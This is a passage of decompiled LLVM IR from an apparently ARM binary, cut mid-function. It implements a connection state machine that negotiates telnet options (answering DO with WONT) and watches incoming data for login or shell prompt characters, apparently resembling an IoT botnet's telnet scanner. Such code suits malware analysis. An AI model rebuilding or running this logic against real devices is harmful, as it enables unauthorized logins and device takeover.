  %v5_10fc4 = call i32 @function_125a0(i32 %v0_10fb4, i32 %v3_10fb8, i32 ptrtoint ([6 x i8]* @global_var_158f8.312 to i32), i32 5)
  store i32 %v5_10fc4, i32* %r0.global-to-local, align 4
  %v3_10fc8 = icmp eq i32 %v5_10fc4, -1
  %v8_10fc8 = icmp eq i32 %v5_10fc4, -1
  store i1 %v8_10fc8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_10fc4, i32* @r7, align 4
  br i1 %v3_10fc8, label %dec_label_pc_10fd4.loopexit, label %dec_label_pc_111c4

dec_label_pc_10fd4.loopexit:                      ; preds = %dec_label_pc_1181c, %dec_label_pc_11160, %dec_label_pc_11054, %dec_label_pc_10fb4, %dec_label_pc_118d4
  %v0_10fd4 = load i32, i32* @r5, align 4
  %v1_10fd4 = add i32 %v0_10fd4, 12
  %v2_10fd4 = inttoptr i32 %v1_10fd4 to i32*
  %v3_10fd4 = load i32, i32* %v2_10fd4, align 4
  store i32 %v3_10fd4, i32* %r1.global-to-local, align 4
  %v2_10fd8103 = icmp eq i32 %v3_10fd4, 0
  store i1 %v2_10fd8103, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10fd8103, label %dec_label_pc_10e90, label %dec_label_pc_10fe0.lr.ph

dec_label_pc_10fe0.lr.ph:                         ; preds = %dec_label_pc_10fd4.preheader, %dec_label_pc_10fd4.loopexit
  %v0_10fe0130 = phi i32 [ %v0_10fd4, %dec_label_pc_10fd4.loopexit ], [ %v0_10fd4104, %dec_label_pc_10fd4.preheader ]
  br label %dec_label_pc_10fe0

dec_label_pc_10fd8thread-pre-split.thread:        ; preds = %dec_label_pc_11208, %dec_label_pc_112bc, %dec_label_pc_114e8, %dec_label_pc_1159c, %dec_label_pc_11650
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10fe0

dec_label_pc_10fd8thread-pre-split:               ; preds = %dec_label_pc_11250, %dec_label_pc_11304, %dec_label_pc_11530, %dec_label_pc_115e4, %dec_label_pc_11698, %dec_label_pc_1167c, %dec_label_pc_115c8, %dec_label_pc_11514, %dec_label_pc_112e8, %dec_label_pc_11234
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10fe0

dec_label_pc_10fe0:                               ; preds = %dec_label_pc_10fd8thread-pre-split.thread, %dec_label_pc_10fd8thread-pre-split, %dec_label_pc_10fe0.lr.ph
  %v0_11958 = phi i32 [ %v0_10fe0130, %dec_label_pc_10fe0.lr.ph ], [ %v0_11054, %dec_label_pc_10fd8thread-pre-split ], [ %v0_11054, %dec_label_pc_10fd8thread-pre-split.thread ]
  %v1_10fe0 = add i32 %v0_11958, 24
  %v2_10fe0 = inttoptr i32 %v1_10fe0 to i32*
  %v3_10fe0 = load i32, i32* %v2_10fe0, align 4
  store i32 %v3_10fe0, i32* %r3.global-to-local, align 4
  %v7_10fe4 = icmp eq i32 %v3_10fe0, 256
  store i1 %v7_10fe4, i1* %cpsr_z.global-to-local, align 1
  %.pre = add i32 %v0_11958, 28
  store i32 %.pre, i32* @r8, align 4
  br i1 %v7_10fe4, label %dec_label_pc_11958, label %dec_label_pc_10ff0

dec_label_pc_10ff0:                               ; preds = %dec_label_pc_10fe0, %dec_label_pc_11958
  store i32 0, i32* @r6, align 4
  %v1_10ff4 = load i32, i32* @sb, align 4
  %v2_10ff4 = inttoptr i32 %v1_10ff4 to i32*
  store i32 0, i32* %v2_10ff4, align 4
  %v0_10ff8 = load i32, i32* @r5, align 4
  %v1_10ff8 = add i32 %v0_10ff8, 24
  %v2_10ff8 = inttoptr i32 %v1_10ff8 to i32*
  %v3_10ff8 = load i32, i32* %v2_10ff8, align 4
  store i32 %v3_10ff8, i32* %r2.global-to-local, align 4
  %v0_10ffc = load i32, i32* @r8, align 4
  %v2_10ffc = add i32 %v0_10ffc, %v3_10ff8
  store i32 %v2_10ffc, i32* @r4, align 4
  %v1_11000 = add i32 %v0_10ff8, 4
  %v2_11000 = inttoptr i32 %v1_11000 to i32*
  %v3_11000 = load i32, i32* %v2_11000, align 4
  store i32 %v3_11000, i32* %r0.global-to-local, align 4
  %v1_11004 = sub i32 256, %v3_10ff8
  store i32 %v1_11004, i32* %r2.global-to-local, align 4
  store i32 %v2_10ffc, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_11010 = inttoptr i32 %v2_10ffc to i32*
  %v5_11010 = call i32 @function_136a0(i32 %v3_11000, i32* %v4_11010, i32 %v1_11004, i32 16384)
  store i32 %v5_11010, i32* %r0.global-to-local, align 4
  %v2_11014 = icmp eq i32 %v5_11010, 0
  store i1 %v2_11014, i1* %cpsr_z.global-to-local, align 1
  %tmp292 = icmp slt i32 %v5_11010, 1
  br i1 %tmp292, label %dec_label_pc_118f8, label %dec_label_pc_1101c

dec_label_pc_1101c:                               ; preds = %dec_label_pc_10ff0
  %v0_1101c = load i32, i32* @r6, align 4
  store i32 %v0_1101c, i32* %r2.global-to-local, align 4
  store i32 65, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11024

dec_label_pc_11024:                               ; preds = %bb294, %dec_label_pc_1101c
  %v3_1102c = phi i32 [ %v1_11030, %bb294 ], [ %v0_1101c, %dec_label_pc_1101c ]
  %v1_11024 = load i32, i32* @r4, align 4
  %v2_11024 = add i32 %v1_11024, %v3_1102c
  %v3_11024 = inttoptr i32 %v2_11024 to i8*
  %v4_11024 = load i8, i8* %v3_11024, align 1
  %v6_11024 = zext i8 %v4_11024 to i32
  store i32 %v6_11024, i32* %r3.global-to-local, align 4
  %v2_11028 = icmp eq i8 %v4_11024, 0
  store i1 %v2_11028, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11028, label %bb293, label %bb294

bb293:                                            ; preds = %dec_label_pc_11024
  %v1_1102c = load i32, i32* %r1.global-to-local, align 4
  %v2_1102c = trunc i32 %v1_1102c to i8
  store i8 %v2_1102c, i8* %v3_11024, align 1
  %v0_11030.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb294

bb294:                                            ; preds = %dec_label_pc_11024, %bb293
  %v0_11030 = phi i32 [ %v3_1102c, %dec_label_pc_11024 ], [ %v0_11030.pre, %bb293 ]
  %v1_11030 = add i32 %v0_11030, 1
  store i32 %v1_11030, i32* %r2.global-to-local, align 4
  %v9_11034 = icmp eq i32 %v5_11010, %v1_11030
  store i1 %v9_11034, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_11034, label %dec_label_pc_1103c, label %dec_label_pc_11024

dec_label_pc_1103c:                               ; preds = %bb294, %dec_label_pc_118fc
  store i32 ptrtoint (i32* @global_var_1e424.184 to i32), i32* %r1.global-to-local, align 4
  %v0_11040 = load i32, i32* @r5, align 4
  %v1_11040 = add i32 %v0_11040, 24
  %v2_11040 = inttoptr i32 %v1_11040 to i32*
  %v3_11040 = load i32, i32* %v2_11040, align 4
  %v2_11044 = load i32, i32* @global_var_1e424.184, align 4
  store i32 %v2_11044, i32* %r3.global-to-local, align 4
  %v2_11048 = add i32 %v3_11040, %v5_11010
  store i32 %v2_11048, i32* %ip.global-to-local, align 4
  store i32 %v2_11048, i32* %v2_11040, align 4
  %v0_11050 = load i32, i32* %r3.global-to-local, align 4
  %v1_11050 = load i32, i32* @r5, align 4
  %v2_11050 = add i32 %v1_11050, 8
  %v3_11050 = inttoptr i32 %v2_11050 to i32*
  store i32 %v0_11050, i32* %v3_11050, align 4
  br label %dec_label_pc_11054

dec_label_pc_11054:                               ; preds = %dec_label_pc_11790, %dec_label_pc_1103c
  %v0_11054 = load i32, i32* @r5, align 4
  %v1_11054 = add i32 %v0_11054, 12
  %v2_11054 = inttoptr i32 %v1_11054 to i32*
  %v3_11054 = load i32, i32* %v2_11054, align 4
  store i32 %v3_11054, i32* %r1.global-to-local, align 4
  %v1_11058 = add i32 %v3_11054, -2
  store i32 %v1_11058, i32* %r3.global-to-local, align 4
  %v7_1105c = icmp eq i32 %v1_11058, 8
  store i1 %v7_1105c, i1* %cpsr_z.global-to-local, align 1
  switch i32 %v3_11054, label %dec_label_pc_10fd4.loopexit [
    i32 2, label %dec_label_pc_1108c
    i32 3, label %dec_label_pc_11170
    i32 4, label %dec_label_pc_11458
    i32 5, label %dec_label_pc_11208
    i32 6, label %dec_label_pc_112bc
    i32 7, label %dec_label_pc_114e8
    i32 8, label %dec_label_pc_1159c
    i32 9, label %dec_label_pc_11650
    i32 10, label %dec_label_pc_11704
  ]

dec_label_pc_1108c:                               ; preds = %dec_label_pc_11054
  %v1_1108c = add i32 %v0_11054, 24
  %v2_1108c = inttoptr i32 %v1_1108c to i32*
  %v3_1108c = load i32, i32* %v2_1108c, align 4
  store i32 %v3_1108c, i32* %ip.global-to-local, align 4
  %v0_11090 = load i32, i32* @r8, align 4
  store i32 %v0_11090, i32* @r6, align 4
  store i32 0, i32* @r7, align 4
  %v1_11098 = add i32 %v0_11054, 29
  store i32 %v1_11098, i32* @r4, align 4
  store i32 -3, i32* %sl.global-to-local, align 4
  %v3_110a094 = icmp eq i32 %v3_1108c, 0
  store i1 %v3_110a094, i1* %cpsr_z.global-to-local, align 1
  %v6_110a4101 = icmp sgt i32 %v3_1108c, 0
  br i1 %v6_110a4101, label %dec_label_pc_110a8.preheader, label %dec_label_pc_11150

dec_label_pc_110a0.loopexit:                      ; preds = %dec_label_pc_110c0
  %v2_110c8 = add i32 %v1_110c8, 2
  store i32 %v2_110c8, i32* @r6, align 4
  %v2_110cc = add i32 %v1_110cc, 2
  store i32 %v2_110cc, i32* @r4, align 4
  %v2_110d0 = add i32 %v1_110d0, 2
  store i32 %v2_110d0, i32* @r7, align 4
  %v9_110a0 = icmp eq i32 %v2_110d0, %v1_110a0
  store i1 %v9_110a0, i1* %cpsr_z.global-to-local, align 1
  %v6_110a4 = icmp slt i32 %v2_110d0, %v1_110a0
  br i1 %v6_110a4, label %dec_label_pc_110a8.preheader, label %dec_label_pc_11150

dec_label_pc_110a8.preheader:                     ; preds = %dec_label_pc_1108c, %dec_label_pc_110a0.loopexit
  %v6_11158166 = phi i32 [ %v6_11158167, %dec_label_pc_110a0.loopexit ], [ %v0_11054, %dec_label_pc_1108c ]
  %v1_110d0155 = phi i32 [ %v2_110d0, %dec_label_pc_110a0.loopexit ], [ 0, %dec_label_pc_1108c ]
  %v1_110c8153 = phi i32 [ %v2_110c8, %dec_label_pc_110a0.loopexit ], [ %v0_11090, %dec_label_pc_1108c ]
  %v1_110b4151 = phi i32 [ %v1_110a0, %dec_label_pc_110a0.loopexit ], [ %v3_1108c, %dec_label_pc_1108c ]
  %v0_110a8149 = phi i32 [ %v2_110cc, %dec_label_pc_110a0.loopexit ], [ %v1_11098, %dec_label_pc_1108c ]
  br label %dec_label_pc_110a8

dec_label_pc_110a8:                               ; preds = %dec_label_pc_110a8.preheader, %dec_label_pc_11130
  %v6_11158167 = phi i32 [ %v6_11158166, %dec_label_pc_110a8.preheader ], [ %v0_11138, %dec_label_pc_11130 ]
  %v1_110d0 = phi i32 [ %v1_110d0155, %dec_label_pc_110a8.preheader ], [ %v1_1113c, %dec_label_pc_11130 ]
  %v1_110c8 = phi i32 [ %v1_110c8153, %dec_label_pc_110a8.preheader ], [ %v1_11144, %dec_label_pc_11130 ]
  %v1_110a0 = phi i32 [ %v1_110b4151, %dec_label_pc_110a8.preheader ], [ %v3_11138, %dec_label_pc_11130 ]
  %v1_110cc = phi i32 [ %v0_110a8149, %dec_label_pc_110a8.preheader ], [ %v1_11148, %dec_label_pc_11130 ]
  %v1_110a8 = add i32 %v1_110cc, -1
  %v2_110a8 = inttoptr i32 %v1_110a8 to i8*
  %v3_110a8 = load i8, i8* %v2_110a8, align 1
  %v4_110a8 = zext i8 %v3_110a8 to i32
  store i32 %v4_110a8, i32* %r3.global-to-local, align 4
  %v2_110ac = icmp eq i8 %v3_110a8, -1
  store i1 %v2_110ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_110ac, label %dec_label_pc_110b4, label %dec_label_pc_11150

dec_label_pc_110b4:                               ; preds = %dec_label_pc_110a8
  %v0_110b4 = load i32, i32* @r8, align 4
  %v2_110b4 = add i32 %v0_110b4, %v1_110a0
  store i32 %v2_110b4, i32* %r2.global-to-local, align 4
  %v9_110b8 = icmp eq i32 %v2_110b4, %v1_110cc
  store i1 %v9_110b8, i1* %cpsr_z.global-to-local, align 1
  %tmp433 = icmp ugt i32 %v2_110b4, %v1_110cc
  br i1 %tmp433, label %dec_label_pc_110c0, label %dec_label_pc_11150

dec_label_pc_110c0:                               ; preds = %dec_label_pc_110b4
  %v1_110c0 = inttoptr i32 %v1_110cc to i8*
  %v2_110c0 = load i8, i8* %v1_110c0, align 1
  %v3_110c0 = zext i8 %v2_110c0 to i32
  store i32 %v3_110c0, i32* %r3.global-to-local, align 4
  %v2_110c4 = icmp eq i8 %v2_110c0, -1
  store i1 %v2_110c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_110c4, label %dec_label_pc_110a0.loopexit, label %dec_label_pc_110d8

dec_label_pc_110d8:                               ; preds = %dec_label_pc_110c0
  %v7_110d8 = icmp eq i8 %v2_110c0, -3
  store i1 %v7_110d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_110d8, label %dec_label_pc_117b4, label %dec_label_pc_110e0

dec_label_pc_110e0:                               ; preds = %dec_label_pc_110d8
  %v1_110e0 = add i32 %v1_110c8, 2
  store i32 %v1_110e0, i32* %r3.global-to-local, align 4
  %v9_110e4 = icmp eq i32 %v2_110b4, %v1_110e0
  store i1 %v9_110e4, i1* %cpsr_z.global-to-local, align 1
  %tmp434 = icmp ugt i32 %v2_110b4, %v1_110e0
  br i1 %tmp434, label %dec_label_pc_110ec, label %dec_label_pc_11150

dec_label_pc_110ec:                               ; preds = %dec_label_pc_110e0, %bb316, %dec_label_pc_11810, %.thread69
  %v0_110ec = load i32, i32* @r4, align 4
  %v1_110ec = inttoptr i32 %v0_110ec to i8*
  %v2_110ec = load i8, i8* %v1_110ec, align 1
  %v3_110ec = zext i8 %v2_110ec to i32
  store i32 %v3_110ec, i32* %r3.global-to-local, align 4
  %v7_110f0 = icmp eq i8 %v2_110ec, -3
  store i1 %v7_110f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_110f0, label %.thread56, label %dec_label_pc_11100

.thread56:                                        ; preds = %dec_label_pc_110ec
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_110ec, align 1
  %v0_110fc.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_110fc.pr.pr, label %bb296, label %.thread56.dec_label_pc_11100thread-pre-split_crit_edge

.thread56.dec_label_pc_11100thread-pre-split_crit_edge: ; preds = %.thread56
  %v0_11100.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11100

dec_label_pc_11100:                               ; preds = %dec_label_pc_110ec, %.thread56.dec_label_pc_11100thread-pre-split_crit_edge
  %v0_11100.pr = phi i32 [ %v0_11100.pr.pre, %.thread56.dec_label_pc_11100thread-pre-split_crit_edge ], [ %v3_110ec, %dec_label_pc_110ec ]
  %v7_11100 = icmp eq i32 %v0_11100.pr, 251
  store i1 %v7_11100, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11100, label %bb295, label %bb296

bb295:                                            ; preds = %dec_label_pc_11100
  %v1_11104 = load i32, i32* %sl.global-to-local, align 4
  %v2_11104 = trunc i32 %v1_11104 to i8
  %v3_11104 = load i32, i32* @r4, align 4
  %v4_11104 = inttoptr i32 %v3_11104 to i8*
  store i8 %v2_11104, i8* %v4_11104, align 1
  br label %bb296

bb296:                                            ; preds = %.thread56, %dec_label_pc_11100, %bb295
  %v0_11108 = load i32, i32* @r4, align 4
  %v1_11108 = add i32 %v0_11108, 1
  %v2_11108 = inttoptr i32 %v1_11108 to i8*
  %v3_11108 = load i8, i8* %v2_11108, align 1
  %v4_11108 = zext i8 %v3_11108 to i32
  store i32 %v4_11108, i32* %r3.global-to-local, align 4
  %v7_1110c = icmp eq i8 %v3_11108, -3
  store i1 %v7_1110c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1110c, label %.thread59, label %dec_label_pc_1111c

.thread59:                                        ; preds = %bb296
  store i32 -4, i32* %ip.global-to-local, align 4
  store i8 -4, i8* %v2_11108, align 1
  %v0_11118.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11118.pr.pr, label %bb298, label %.thread59.dec_label_pc_1111c_crit_edge

.thread59.dec_label_pc_1111c_crit_edge:           ; preds = %.thread59
  %v0_1111c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1111c

dec_label_pc_1111c:                               ; preds = %.thread59.dec_label_pc_1111c_crit_edge, %bb296
  %v0_1111c = phi i32 [ %v0_1111c.pre, %.thread59.dec_label_pc_1111c_crit_edge ], [ %v4_11108, %bb296 ]
  %v7_1111c = icmp eq i32 %v0_1111c, 251
  store i1 %v7_1111c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1111c, label %bb297, label %bb298

bb297:                                            ; preds = %dec_label_pc_1111c
  %v1_11120 = load i32, i32* %sl.global-to-local, align 4
  %v2_11120 = trunc i32 %v1_11120 to i8
  %v3_11120 = load i32, i32* @r4, align 4
  %v4_11120 = add i32 %v3_11120, 1
  %v5_11120 = inttoptr i32 %v4_11120 to i8*
  store i8 %v2_11120, i8* %v5_11120, align 1
  br label %bb298

bb298:                                            ; preds = %.thread59, %dec_label_pc_1111c, %bb297
  %v0_11124 = load i32, i32* @r5, align 4
  %v1_11124 = add i32 %v0_11124, 4
  %v2_11124 = inttoptr i32 %v1_11124 to i32*
  %v3_11124 = load i32, i32* %v2_11124, align 4
  store i32 %v3_11124, i32* %r0.global-to-local, align 4
  %v0_11128 = load i32, i32* @r6, align 4
  br label %dec_label_pc_11130

dec_label_pc_11130:                               ; preds = %dec_label_pc_1197c, %bb298
  %v0_11134 = phi i32 [ %v3_11998, %dec_label_pc_1197c ], [ %v3_11124, %bb298 ]
  %storemerge5 = phi i32 [ %v2_117d0, %dec_label_pc_1197c ], [ %v0_11128, %bb298 ]
  %storemerge = phi i32 [ 9, %dec_label_pc_1197c ], [ 3, %bb298 ]
  store i32 %storemerge5, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_11134 = inttoptr i32 %storemerge5 to i32*
  %v5_11134 = call i32 @function_13700(i32 %v0_11134, i32* %v4_11134, i32 %storemerge, i32 16384)
  store i32 %v5_11134, i32* %r0.global-to-local, align 4
  %v0_11138 = load i32, i32* @r5, align 4
  %v1_11138 = add i32 %v0_11138, 24
  %v2_11138 = inttoptr i32 %v1_11138 to i32*
  %v3_11138 = load i32, i32* %v2_11138, align 4
  store i32 %v3_11138, i32* %ip.global-to-local, align 4
  %v0_1113c = load i32, i32* @r7, align 4
  %v1_1113c = add i32 %v0_1113c, 3
  store i32 %v1_1113c, i32* @r7, align 4
  %v9_11140 = icmp eq i32 %v1_1113c, %v3_11138
  store i1 %v9_11140, i1* %cpsr_z.global-to-local, align 1
  %v0_11144 = load i32, i32* @r6, align 4
  %v1_11144 = add i32 %v0_11144, 3
  store i32 %v1_11144, i32* @r6, align 4
  %v0_11148 = load i32, i32* @r4, align 4
  %v1_11148 = add i32 %v0_11148, 3
  store i32 %v1_11148, i32* @r4, align 4
  %v5_1114c = icmp slt i32 %v1_1113c, %v3_11138
  br i1 %v5_1114c, label %dec_label_pc_110a8, label %dec_label_pc_11150

dec_label_pc_11150:                               ; preds = %dec_label_pc_110e0, %dec_label_pc_110b4, %dec_label_pc_110a0.loopexit, %dec_label_pc_110a8, %dec_label_pc_11130, %dec_label_pc_1108c, %dec_label_pc_117b4.dec_label_pc_11150.loopexit_crit_edge
  %v6_11158 = phi i32 [ %v0_117dc, %dec_label_pc_117b4.dec_label_pc_11150.loopexit_crit_edge ], [ %v0_11054, %dec_label_pc_1108c ], [ %v6_11158167, %dec_label_pc_110a8 ], [ %v0_11138, %dec_label_pc_11130 ], [ %v6_11158167, %dec_label_pc_110e0 ], [ %v6_11158167, %dec_label_pc_110b4 ], [ %v6_11158167, %dec_label_pc_110a0.loopexit ]
  %v0_11160.pre = phi i32 [ %v0_11150.pre.pre, %dec_label_pc_117b4.dec_label_pc_11150.loopexit_crit_edge ], [ 0, %dec_label_pc_1108c ], [ %v1_110d0, %dec_label_pc_110a8 ], [ %v1_1113c, %dec_label_pc_11130 ], [ %v1_110d0, %dec_label_pc_110e0 ], [ %v1_110d0, %dec_label_pc_110b4 ], [ %v2_110d0, %dec_label_pc_110a0.loopexit ]
  %v2_11150 = icmp eq i32 %v0_11160.pre, 0
  store i1 %v2_11150, i1* %cpsr_z.global-to-local, align 1
  %tmp299 = icmp slt i32 %v0_11160.pre, 1
  br i1 %tmp299, label %dec_label_pc_11160, label %.thread198

.thread198:                                       ; preds = %dec_label_pc_11150
  store i32 3, i32* %r1.global-to-local, align 4
  %v7_11158 = add i32 %v6_11158, 12
  %v8_11158 = inttoptr i32 %v7_11158 to i32*
  store i32 3, i32* %v8_11158, align 4
  br label %dec_label_pc_11790

dec_label_pc_11160:                               ; preds = %dec_label_pc_11150, %dec_label_pc_111c4, %dec_label_pc_11868, %dec_label_pc_116a4, %dec_label_pc_115f0, %dec_label_pc_1153c, %dec_label_pc_114a4, %dec_label_pc_11310, %dec_label_pc_1125c
  %v0_11160 = phi i32 [ %v0_111c4, %dec_label_pc_111c4 ], [ %v0_11860, %dec_label_pc_11868 ], [ %v1_11698, %dec_label_pc_116a4 ], [ %v1_115e4, %dec_label_pc_115f0 ], [ %v1_11530, %dec_label_pc_1153c ], [ %v0_114a4, %dec_label_pc_114a4 ], [ %v1_11304, %dec_label_pc_11310 ], [ %v1_11250, %dec_label_pc_1125c ], [ %v0_11160.pre, %dec_label_pc_11150 ]
  %v2_11160 = icmp eq i32 %v0_11160, 0
  store i1 %v2_11160, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11160, label %dec_label_pc_10fd4.loopexit, label %dec_label_pc_11168

dec_label_pc_11168:                               ; preds = %dec_label_pc_11160
  %v0_11168 = load i32, i32* @r5, align 4
  %v1_11168 = add i32 %v0_11168, 24
  %v2_11168 = inttoptr i32 %v1_11168 to i32*
  %v3_11168 = load i32, i32* %v2_11168, align 4
  store i32 %v3_11168, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11790

dec_label_pc_11170:                               ; preds = %dec_label_pc_11054
  %v1_11170 = add i32 %v0_11054, 24
  %v2_11170 = inttoptr i32 %v1_11170 to i32*
  %v3_11170 = load i32, i32* %v2_11170, align 4
  store i32 %v3_11170, i32* %ip.global-to-local, align 4
  %v1_11174 = add i32 %v3_11170, -1
  store i32 %v1_11174, i32* %r0.global-to-local, align 4
  %v2_11178 = icmp eq i32 %v1_11174, 0
  store i1 %v2_11178, i1* %cpsr_z.global-to-local, align 1
  %v5_1117c = icmp sgt i32 %v1_11174, 0
  br i1 %v5_1117c, label %dec_label_pc_111a4, label %dec_label_pc_10f94

dec_label_pc_11184:                               ; preds = %bb300
  %v7_11184 = icmp eq i8 %v3_111a8, 36
  store i1 %v7_11184, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11184, label %dec_label_pc_111b8, label %dec_label_pc_1118c

dec_label_pc_1118c:                               ; preds = %dec_label_pc_11184
  %v7_1118c = icmp eq i8 %v3_111a8, 35
  store i1 %v7_1118c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1118c, label %dec_label_pc_111b8, label %dec_label_pc_11194

dec_label_pc_11194:                               ; preds = %dec_label_pc_1118c
  %v7_11194 = icmp eq i8 %v3_111a8, 37
  store i1 %v7_11194, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11194, label %dec_label_pc_111b8, label %dec_label_pc_1119c

dec_label_pc_1119c:                               ; preds = %dec_label_pc_11194
  %v1_1119c = add i32 %v0_111b8, -1
  store i32 %v1_1119c, i32* %r0.global-to-local, align 4
  %v7_1119c = icmp eq i32 %v0_111b8, 1
  store i1 %v7_1119c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1119c, label %dec_label_pc_10f94, label %dec_label_pc_111a4

dec_label_pc_111a4:                               ; preds = %dec_label_pc_11170, %dec_label_pc_1119c
  %v0_111b8 = phi i32 [ %v1_1119c, %dec_label_pc_1119c ], [ %v1_11174, %dec_label_pc_11170 ]
  %v2_111a4 = add i32 %v0_111b8, %v0_11054
  store i32 %v2_111a4, i32* %r3.global-to-local, align 4
  %v1_111a8 = add i32 %v2_111a4, 28
  %v2_111a8 = inttoptr i32 %v1_111a8 to i8*
  %v3_111a8 = load i8, i8* %v2_111a8, align 1
  %v4_111a8 = zext i8 %v3_111a8 to i32
  store i32 %v4_111a8, i32* %r3.global-to-local, align 4
  %v7_111ac = icmp eq i8 %v3_111a8, 62
  store i1 %v7_111ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_111ac, label %dec_label_pc_111b8, label %bb300

bb300:                                            ; preds = %dec_label_pc_111a4
  %v8_111b0 = icmp eq i8 %v3_111a8, 58
  store i1 %v8_111b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_111b0, label %dec_label_pc_111b8, label %dec_label_pc_11184

dec_label_pc_111b8:                               ; preds = %dec_label_pc_111a4, %bb300, %dec_label_pc_11194, %dec_label_pc_1118c, %dec_label_pc_11184
  %v1_111b8 = add i32 %v0_111b8, 1
  store i32 %v1_111b8, i32* @r7, align 4
  %v7_111bc = icmp eq i32 %v0_111b8, -2
  store i1 %v7_111bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_111bc, label %dec_label_pc_10f94, label %dec_label_pc_111c4

dec_label_pc_111c4:                               ; preds = %dec_label_pc_111b8, %dec_label_pc_10fb4, %dec_label_pc_10f94
  %v0_111c4 = phi i32 [ %v5_10fc4, %dec_label_pc_10fb4 ], [ %v5_10fa4, %dec_label_pc_10f94 ], [ %v1_111b8, %dec_label_pc_111b8 ]
  %v2_111c4 = icmp eq i32 %v0_111c4, 0
  store i1 %v2_111c4, i1* %cpsr_z.global-to-local, align 1
  %tmp301 = icmp slt i32 %v0_111c4, 1
  br i1 %tmp301, label %dec_label_pc_11160, label %dec_label_pc_111cc

dec_label_pc_111cc:                               ; preds = %dec_label_pc_111c4
  %v0_111cc = load i32, i32* @r5, align 4
  %v1_111cc = inttoptr i32 %v0_111cc to i32*
  %v2_111cc = load i32, i32* %v1_111cc, align 4
  store i32 %v2_111cc, i32* %r3.global-to-local, align 4
  %v1_111d0 = add i32 %v0_111cc, 4
  %v2_111d0 = inttoptr i32 %v1_111d0 to i32*
  %v3_111d0 = load i32, i32* %v2_111d0, align 4
  store i32 %v3_111d0, i32* %r0.global-to-local, align 4
  %v1_111d4 = add i32 %v2_111cc, 12
  %v2_111d4 = inttoptr i32 %v1_111d4 to i8*
  %v3_111d4 = load i8, i8* %v2_111d4, align 1
  %v4_111d4 = zext i8 %v3_111d4 to i32
  store i32 %v4_111d4, i32* %r2.global-to-local, align 4
  %v1_111d8 = inttoptr i32 %v2_111cc to i32*
  %v2_111d8 = load i32, i32* %v1_111d8, align 4
  store i32 %v2_111d8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_111e0 = inttoptr i32 %v2_111d8 to i32*
  %v5_111e0 = call i32 @function_13700(i32 %v3_111d0, i32* %v4_111e0, i32 %v4_111d4, i32 16384)
  store i32 %v5_111e0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32), i32* %r1.global-to-local, align 4
  %v0_111e8 = load i32, i32* @r5, align 4
  %v1_111e8 = add i32 %v0_111e8, 4
  %v2_111e8 = inttoptr i32 %v1_111e8 to i32*
  %v3_111e8 = load i32, i32* %v2_111e8, align 4
  store i32 %v3_111e8, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_111f4 = call i32 @function_13700(i32 %v3_111e8, i32* bitcast ([3 x i8]* @global_var_15750.34 to i32*), i32 2, i32 16384)
  store i32 %v6_111f4, i32* %r0.global-to-local, align 4
  %v0_111f8 = load i32, i32* @r5, align 4
  %v1_111f8 = add i32 %v0_111f8, 24
  %v2_111f8 = inttoptr i32 %v1_111f8 to i32*
  %v3_111f8 = load i32, i32* %v2_111f8, align 4
  store i32 %v3_111f8, i32* %ip.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_11200 = add i32 %v0_111f8, 12
  %v3_11200 = inttoptr i32 %v2_11200 to i32*
  store i32 4, i32* %v3_11200, align 4
  br label %dec_label_pc_11790

dec_label_pc_11208:                               ; preds = %dec_label_pc_11054
  %v1_11208 = add i32 %v0_11054, 24
  %v2_11208 = inttoptr i32 %v1_11208 to i32*
  %v3_11208 = load i32, i32* %v2_11208, align 4
  store i32 %v3_11208, i32* %ip.global-to-local, align 4
  %v1_1120c = add i32 %v3_11208, -1
  store i32 %v1_1120c, i32* %r0.global-to-local, align 4
  %v2_11210 = icmp eq i32 %v1_1120c, 0
  store i1 %v2_11210, i1* %cpsr_z.global-to-local, align 1
  %v5_11214 = icmp sgt i32 %v1_1120c, 0
  br i1 %v5_11214, label %dec_label_pc_1123c, label %dec_label_pc_10fd8thread-pre-split.thread

dec_label_pc_1121c:                               ; preds = %bb302
  %v7_1121c = icmp eq i8 %v3_11240, 36
  store i1 %v7_1121c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1121c, label %dec_label_pc_11250, label %dec_label_pc_11224

dec_label_pc_11224:                               ; preds = %dec_label_pc_1121c
